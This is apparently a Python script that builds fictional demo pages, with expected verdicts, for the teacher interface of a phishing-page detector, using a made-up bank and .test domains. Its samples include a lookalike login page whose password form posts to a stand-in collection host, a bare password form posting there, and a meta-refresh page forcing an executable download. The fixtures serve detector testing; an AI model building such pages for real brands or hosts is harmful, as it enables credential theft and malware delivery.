"""Create the demo pages for the teacher UI. Fictional content only: fictional brand, .test domains (reserved for testing).

    python -m aidev.samples.ai2.make_samples

Writes aidev/samples/ai2/pages/*.html and aidev/samples/ai2/manifest.json.
"""
import json
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAGES = HERE / "pages"

NOTE = ("Fictional demonstration page. The model was trained on real pages, so its score here only illustrates "
        "the behaviour; it is not an accuracy measurement.")


def login(domain: str, action: str, blocks: int = 30) -> str:
    rows = "".join(f'<div class="row"><span><a href="https://{domain}/help{i}">help {i}</a></span>'
                   f'<p>Information line {i} about the ExampleBank service.</p></div>' for i in range(blocks))
    return (f'<html><head><title>ExampleBank sign in</title></head><body><h1>ExampleBank</h1>{rows}'
            f'<form action="{action}" method="post"><input type="text" name="user">'
            f'<input type="password" name="pass"><input type="submit" value="Sign in"></form>'
            f'<footer>&copy; 2026 ExampleBank Ltd</footer></body></html>')


def article() -> str:
    paras = "".join(f"<p>The local bakery on the corner opened its doors again this morning, serving bread, "
                    f"coffee and a new seasonal cake number {i}. Regular customers said the cake was worth the wait.</p>"
                    for i in range(40))
    return f"<html><head><title>Local bakery reopens</title></head><body><h1>Local bakery reopens</h1>{paras}</body></html>"


def short_password() -> str:
    return ('<html><body><form action="https://collect-data.test/save" method="post">'
            '<input type="password" name="pass"><input type="submit" value="Continue"></form></body></html>')


def meta_redirect() -> str:
    return ('<html><head><meta http-equiv="refresh" content="0; url=https://collect-data.test/setup.exe">'
            '<title>Please wait</title></head><body><p>Please wait while we prepare your page for you. '
            'This takes a moment and you do not need to do anything else.</p></body></html>')


SAMPLES = [
    {"file": "benign_login.html", "title": "1. Ordinary login page (own domain)", "url": "https://examplebank.test/login",
     "html": lambda: login("examplebank.test", "https://examplebank.test/login"),
     "expected": "not flagged", "why": "The form sends data to its own domain, and the page has normal content."},
    {"file": "lookalike_login.html", "title": "2. Lookalike login page (sends password elsewhere)", "url": "https://examp1ebank.test/login",
     "html": lambda: login("examp1ebank.test", "https://collect-data.test/save"),
     "expected": "flagged", "why": "Same layout as sample 1, but the password form submits to a different website."},
    {"file": "short_password.html", "title": "3. Very short page with a password field", "url": "https://collect-data.test/p",
     "html": short_password,
     "expected": "no decision or flagged", "why": "Short pages carry little evidence. The model is weak here (see error analysis), so this is a known limit."},
    {"file": "benign_article.html", "title": "4. Ordinary news-style article", "url": "https://localnews.test/bakery",
     "html": article,
     "expected": "not flagged", "why": "Plain text, no forms, no links to other websites."},
    {"file": "meta_redirect.html", "title": "5. Page that forces a program download", "url": "https://collect-data.test/start",
     "html": meta_redirect,
     "expected": "flagged or downloaded", "why": "The page redirects to a program file by itself (meta refresh). The detector counts this as a download signal, not as content."},
]


def main() -> None:
    PAGES.mkdir(parents=True, exist_ok=True)
    manifest = []
    for s in SAMPLES:
        (PAGES / s["file"]).write_text(s["html"](), encoding="utf-8")
        manifest.append({"file": s["file"], "title": s["title"], "url": s["url"],
                         "expected": s["expected"], "why": s["why"], "note": NOTE})
    (HERE / "manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"wrote {len(manifest)} pages to {PAGES} and manifest.json")


if __name__ == "__main__":
    main()
